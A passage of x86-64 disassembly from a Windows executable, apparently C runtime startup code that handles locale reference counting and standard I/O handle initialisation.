   1400047b8:	48 8d 05 89 43 01 00 	lea    0x14389(%rip),%rax        # 0x140018b48
   1400047bf:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   1400047c3:	89 51 28             	mov    %edx,0x28(%rcx)
   1400047c6:	48 8d 0d a3 9a 00 00 	lea    0x9aa3(%rip),%rcx        # 0x14000e270
   1400047cd:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047d1:	48 89 08             	mov    %rcx,(%rax)
   1400047d4:	48 8d 0d 95 28 01 00 	lea    0x12895(%rip),%rcx        # 0x140017070
   1400047db:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047df:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1400047e5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047e9:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1400047f0:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1400047f3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400047f7:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1400047fb:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   140004802:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004806:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   14000480d:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004811:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140004815:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   14000481c:	00 
   14000481d:	e8 16 01 00 00       	call   0x140004938
   140004822:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140004826:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000482a:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   14000482e:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004832:	e8 41 01 00 00       	call   0x140004978
   140004837:	48 83 c4 50          	add    $0x50,%rsp
   14000483b:	5d                   	pop    %rbp
   14000483c:	c3                   	ret
   14000483d:	cc                   	int3
   14000483e:	cc                   	int3
   14000483f:	cc                   	int3
   140004840:	40 55                	rex push %rbp
   140004842:	48 8b ec             	mov    %rsp,%rbp
   140004845:	48 83 ec 40          	sub    $0x40,%rsp
   140004849:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000484d:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140004851:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140004855:	48 8d 15 14 9a 00 00 	lea    0x9a14(%rip),%rdx        # 0x14000e270
   14000485c:	b8 05 00 00 00       	mov    $0x5,%eax
   140004861:	89 45 20             	mov    %eax,0x20(%rbp)
   140004864:	89 45 28             	mov    %eax,0x28(%rbp)
   140004867:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   14000486b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000486f:	b8 04 00 00 00       	mov    $0x4,%eax
   140004874:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140004877:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   14000487a:	48 8b 01             	mov    (%rcx),%rax
   14000487d:	48 3b c2             	cmp    %rdx,%rax
   140004880:	74 0c                	je     0x14000488e
   140004882:	48 8b c8             	mov    %rax,%rcx
   140004885:	e8 4a 0f 00 00       	call   0x1400057d4
   14000488a:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000488e:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   140004892:	e8 3d 0f 00 00       	call   0x1400057d4
   140004897:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   14000489b:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   14000489f:	e8 30 0f 00 00       	call   0x1400057d4
   1400048a4:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048a8:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   1400048ac:	e8 23 0f 00 00       	call   0x1400057d4
   1400048b1:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048b5:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1400048b9:	e8 16 0f 00 00       	call   0x1400057d4
   1400048be:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048c2:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1400048c6:	e8 09 0f 00 00       	call   0x1400057d4
   1400048cb:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048cf:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1400048d3:	e8 fc 0e 00 00       	call   0x1400057d4
   1400048d8:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048dc:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1400048e0:	e8 ef 0e 00 00       	call   0x1400057d4
   1400048e5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048e9:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1400048f0:	e8 df 0e 00 00       	call   0x1400057d4
   1400048f5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1400048f9:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   140004900:	e8 cf 0e 00 00       	call   0x1400057d4
   140004905:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   140004909:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   14000490d:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   140004911:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140004915:	e8 a6 00 00 00       	call   0x1400049c0
   14000491a:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   14000491e:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   140004922:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   140004926:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   14000492a:	e8 f1 00 00 00       	call   0x140004a20
   14000492f:	48 83 c4 40          	add    $0x40,%rsp
   140004933:	5d                   	pop    %rbp
   140004934:	c3                   	ret
   140004935:	cc                   	int3
   140004936:	cc                   	int3
   140004937:	cc                   	int3
   140004938:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000493d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004942:	57                   	push   %rdi
   140004943:	48 83 ec 20          	sub    $0x20,%rsp
   140004947:	49 8b d9             	mov    %r9,%rbx
   14000494a:	49 8b f8             	mov    %r8,%rdi
   14000494d:	8b 0a                	mov    (%rdx),%ecx
   14000494f:	e8 8c fa ff ff       	call   0x1400043e0
   140004954:	90                   	nop
   140004955:	48 8b 07             	mov    (%rdi),%rax
   140004958:	48 8b 08             	mov    (%rax),%rcx
   14000495b:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   140004962:	f0 ff 00             	lock incl (%rax)
   140004965:	8b 0b                	mov    (%rbx),%ecx
   140004967:	e8 90 fa ff ff       	call   0x1400043fc
   14000496c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004971:	48 83 c4 20          	add    $0x20,%rsp
   140004975:	5f                   	pop    %rdi
   140004976:	c3                   	ret
   140004977:	cc                   	int3
   140004978:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000497d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004982:	57                   	push   %rdi
   140004983:	48 83 ec 20          	sub    $0x20,%rsp
   140004987:	49 8b d9             	mov    %r9,%rbx
   14000498a:	49 8b f8             	mov    %r8,%rdi
   14000498d:	8b 0a                	mov    (%rdx),%ecx
   14000498f:	e8 4c fa ff ff       	call   0x1400043e0
   140004994:	90                   	nop
   140004995:	48 8b 47 08          	mov    0x8(%rdi),%rax
   140004999:	48 8b 10             	mov    (%rax),%rdx
   14000499c:	48 8b 0f             	mov    (%rdi),%rcx
   14000499f:	48 8b 12             	mov    (%rdx),%rdx
   1400049a2:	48 8b 09             	mov    (%rcx),%rcx
   1400049a5:	e8 5e fd ff ff       	call   0x140004708
   1400049aa:	90                   	nop
   1400049ab:	8b 0b                	mov    (%rbx),%ecx
   1400049ad:	e8 4a fa ff ff       	call   0x1400043fc
   1400049b2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400049b7:	48 83 c4 20          	add    $0x20,%rsp
   1400049bb:	5f                   	pop    %rdi
   1400049bc:	c3                   	ret
   1400049bd:	cc                   	int3
   1400049be:	cc                   	int3
   1400049bf:	cc                   	int3
   1400049c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400049c5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400049ca:	57                   	push   %rdi
   1400049cb:	48 83 ec 20          	sub    $0x20,%rsp
   1400049cf:	49 8b d9             	mov    %r9,%rbx
   1400049d2:	49 8b f8             	mov    %r8,%rdi
   1400049d5:	8b 0a                	mov    (%rdx),%ecx
   1400049d7:	e8 04 fa ff ff       	call   0x1400043e0
   1400049dc:	90                   	nop
   1400049dd:	48 8b 07             	mov    (%rdi),%rax
   1400049e0:	48 8b 08             	mov    (%rax),%rcx
   1400049e3:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   1400049ea:	48 85 c9             	test   %rcx,%rcx
   1400049ed:	74 1e                	je     0x140004a0d
   1400049ef:	83 c8 ff             	or     $0xffffffff,%eax
   1400049f2:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   1400049f6:	83 f8 01             	cmp    $0x1,%eax
   1400049f9:	75 12                	jne    0x140004a0d
   1400049fb:	48 8d 05 6e 26 01 00 	lea    0x1266e(%rip),%rax        # 0x140017070
   140004a02:	48 3b c8             	cmp    %rax,%rcx
   140004a05:	74 06                	je     0x140004a0d
   140004a07:	e8 c8 0d 00 00       	call   0x1400057d4
   140004a0c:	90                   	nop
   140004a0d:	8b 0b                	mov    (%rbx),%ecx
   140004a0f:	e8 e8 f9 ff ff       	call   0x1400043fc
   140004a14:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a19:	48 83 c4 20          	add    $0x20,%rsp
   140004a1d:	5f                   	pop    %rdi
   140004a1e:	c3                   	ret
   140004a1f:	cc                   	int3
   140004a20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a25:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004a2a:	57                   	push   %rdi
   140004a2b:	48 83 ec 20          	sub    $0x20,%rsp
   140004a2f:	49 8b d9             	mov    %r9,%rbx
   140004a32:	49 8b f8             	mov    %r8,%rdi
   140004a35:	8b 0a                	mov    (%rdx),%ecx
   140004a37:	e8 a4 f9 ff ff       	call   0x1400043e0
   140004a3c:	90                   	nop
   140004a3d:	48 8b 0f             	mov    (%rdi),%rcx
   140004a40:	33 d2                	xor    %edx,%edx
   140004a42:	48 8b 09             	mov    (%rcx),%rcx
   140004a45:	e8 be fc ff ff       	call   0x140004708
   140004a4a:	90                   	nop
   140004a4b:	8b 0b                	mov    (%rbx),%ecx
   140004a4d:	e8 aa f9 ff ff       	call   0x1400043fc
   140004a52:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a57:	48 83 c4 20          	add    $0x20,%rsp
   140004a5b:	5f                   	pop    %rdi
   140004a5c:	c3                   	ret
   140004a5d:	cc                   	int3
   140004a5e:	cc                   	int3
   140004a5f:	cc                   	int3
   140004a60:	40 53                	rex push %rbx
   140004a62:	48 83 ec 20          	sub    $0x20,%rsp
   140004a66:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004a6b:	e8 70 f9 ff ff       	call   0x1400043e0
   140004a70:	33 db                	xor    %ebx,%ebx
   140004a72:	33 c9                	xor    %ecx,%ecx
   140004a74:	e8 fb 39 00 00       	call   0x140008474
   140004a79:	85 c0                	test   %eax,%eax
   140004a7b:	75 0c                	jne    0x140004a89
   140004a7d:	e8 5a 00 00 00       	call   0x140004adc
   140004a82:	e8 45 01 00 00       	call   0x140004bcc
   140004a87:	b3 01                	mov    $0x1,%bl
   140004a89:	b9 07 00 00 00       	mov    $0x7,%ecx
   140004a8e:	e8 69 f9 ff ff       	call   0x1400043fc
   140004a93:	8a c3                	mov    %bl,%al
   140004a95:	48 83 c4 20          	add    $0x20,%rsp
   140004a99:	5b                   	pop    %rbx
   140004a9a:	c3                   	ret
   140004a9b:	cc                   	int3
   140004a9c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004aa1:	57                   	push   %rdi
   140004aa2:	48 83 ec 20          	sub    $0x20,%rsp
   140004aa6:	33 db                	xor    %ebx,%ebx
   140004aa8:	48 8d 3d 41 3c 01 00 	lea    0x13c41(%rip),%rdi        # 0x1400186f0
   140004aaf:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140004ab3:	48 85 c9             	test   %rcx,%rcx
   140004ab6:	74 0a                	je     0x140004ac2
   140004ab8:	e8 67 39 00 00       	call   0x140008424
   140004abd:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   140004ac2:	48 83 c3 08          	add    $0x8,%rbx
   140004ac6:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   140004acd:	72 d9                	jb     0x140004aa8
   140004acf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004ad4:	b0 01                	mov    $0x1,%al
   140004ad6:	48 83 c4 20          	add    $0x20,%rsp
   140004ada:	5f                   	pop    %rdi
   140004adb:	c3                   	ret
   140004adc:	48 8b c4             	mov    %rsp,%rax
   140004adf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004ae3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004ae7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004aeb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004aef:	41 56                	push   %r14
   140004af1:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140004af8:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   140004afc:	ff 15 3e 0d 01 00    	call   *0x10d3e(%rip)        # 0x140015840
   140004b02:	45 33 f6             	xor    %r14d,%r14d
   140004b05:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   140004b0b:	0f 84 9a 00 00 00    	je     0x140004bab
   140004b11:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140004b16:	48 85 c0             	test   %rax,%rax
   140004b19:	0f 84 8c 00 00 00    	je     0x140004bab
   140004b1f:	48 63 18             	movslq (%rax),%rbx
   140004b22:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140004b26:	bf 00 20 00 00       	mov    $0x2000,%edi
   140004b2b:	48 03 de             	add    %rsi,%rbx
   140004b2e:	39 38                	cmp    %edi,(%rax)
   140004b30:	0f 4c 38             	cmovl  (%rax),%edi
   140004b33:	8b cf                	mov    %edi,%ecx
   140004b35:	e8 3a 39 00 00       	call   0x140008474
   140004b3a:	3b 3d b0 3f 01 00    	cmp    0x13fb0(%rip),%edi        # 0x140018af0
   140004b40:	0f 4f 3d a9 3f 01 00 	cmovg  0x13fa9(%rip),%edi        # 0x140018af0
   140004b47:	85 ff                	test   %edi,%edi
   140004b49:	74 60                	je     0x140004bab
   140004b4b:	41 8b ee             	mov    %r14d,%ebp
   140004b4e:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140004b52:	74 47                	je     0x140004b9b
   140004b54:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140004b58:	74 41                	je     0x140004b9b
   140004b5a:	f6 06 01             	testb  $0x1,(%rsi)
   140004b5d:	74 3c                	je     0x140004b9b
   140004b5f:	f6 06 08             	testb  $0x8,(%rsi)
   140004b62:	75 0d                	jne    0x140004b71
   140004b64:	48 8b 0b             	mov    (%rbx),%rcx
   140004b67:	ff 15 93 0c 01 00    	call   *0x10c93(%rip)        # 0x140015800
   140004b6d:	85 c0                	test   %eax,%eax
   140004b6f:	74 2a                	je     0x140004b9b
   140004b71:	48 8b c5             	mov    %rbp,%rax
   140004b74:	4c 8d 05 75 3b 01 00 	lea    0x13b75(%rip),%r8        # 0x1400186f0
   140004b7b:	48 8b cd             	mov    %rbp,%rcx
   140004b7e:	48 c1 f9 06          	sar    $0x6,%rcx
   140004b82:	83 e0 3f             	and    $0x3f,%eax
   140004b85:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140004b89:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140004b8d:	48 8b 03             	mov    (%rbx),%rax
   140004b90:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140004b95:	8a 06                	mov    (%rsi),%al
   140004b97:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140004b9b:	48 ff c5             	inc    %rbp
   140004b9e:	48 ff c6             	inc    %rsi
   140004ba1:	48 83 c3 08          	add    $0x8,%rbx
   140004ba5:	48 83 ef 01          	sub    $0x1,%rdi
   140004ba9:	75 a3                	jne    0x140004b4e
   140004bab:	4c 8d 9c 24 90 00 00 	lea    0x90(%rsp),%r11
   140004bb2:	00 
   140004bb3:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004bb7:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   140004bbb:	49 8b 73 20          	mov    0x20(%r11),%rsi
   140004bbf:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   140004bc3:	49 8b e3             	mov    %r11,%rsp
   140004bc6:	41 5e                	pop    %r14
   140004bc8:	c3                   	ret
   140004bc9:	cc                   	int3
   140004bca:	cc                   	int3
   140004bcb:	cc                   	int3
   140004bcc:	48 8b c4             	mov    %rsp,%rax
   140004bcf:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140004bd3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140004bd7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140004bdb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140004bdf:	41 56                	push   %r14
   140004be1:	48 83 ec 20          	sub    $0x20,%rsp
   140004be5:	33 f6                	xor    %esi,%esi
   140004be7:	45 33 f6             	xor    %r14d,%r14d
   140004bea:	48 63 ce             	movslq %esi,%rcx
   140004bed:	48 8d 3d fc 3a 01 00 	lea    0x13afc(%rip),%rdi        # 0x1400186f0
   140004bf4:	48 8b c1             	mov    %rcx,%rax
   140004bf7:	83 e1 3f             	and    $0x3f,%ecx
   140004bfa:	48 c1 f8 06          	sar    $0x6,%rax
   140004bfe:	48 8d 1c c9          	lea    (%rcx,%rcx,8),%rbx
   140004c02:	48 8b 3c c7          	mov    (%rdi,%rax,8),%rdi
   140004c06:	48 8b 44 df 28       	mov    0x28(%rdi,%rbx,8),%rax
   140004c0b:	48 83 c0 02          	add    $0x2,%rax
   140004c0f:	48 83 f8 01          	cmp    $0x1,%rax
   140004c13:	76 0a                	jbe    0x140004c1f
   140004c15:	80 4c df 38 80       	orb    $0x80,0x38(%rdi,%rbx,8)
   140004c1a:	e9 8f 00 00 00       	jmp    0x140004cae
   140004c1f:	c6 44 df 38 81       	movb   $0x81,0x38(%rdi,%rbx,8)
   140004c24:	8b ce                	mov    %esi,%ecx
   140004c26:	85 f6                	test   %esi,%esi
   140004c28:	74 16                	je     0x140004c40
   140004c2a:	83 e9 01             	sub    $0x1,%ecx
   140004c2d:	74 0a                	je     0x140004c39
   140004c2f:	83 f9 01             	cmp    $0x1,%ecx
   140004c32:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   140004c37:	eb 0c                	jmp    0x140004c45
   140004c39:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   140004c3e:	eb 05                	jmp    0x140004c45
   140004c40:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   140004c45:	ff 15 fd 0b 01 00    	call   *0x10bfd(%rip)        # 0x140015848
   140004c4b:	48 8b e8             	mov    %rax,%rbp
   140004c4e:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140004c52:	48 83 f9 01          	cmp    $0x1,%rcx
   140004c56:	76 0b                	jbe    0x140004c63
   140004c58:	48 8b c8             	mov    %rax,%rcx
   140004c5b:	ff 15 9f 0b 01 00    	call   *0x10b9f(%rip)        # 0x140015800
   140004c61:	eb 02                	jmp    0x140004c65
   140004c63:	33 c0                	xor    %eax,%eax
   140004c65:	85 c0                	test   %eax,%eax
   140004c67:	74 20                	je     0x140004c89
   140004c69:	0f b6 c8             	movzbl %al,%ecx
   140004c6c:	48 89 6c df 28       	mov    %rbp,0x28(%rdi,%rbx,8)
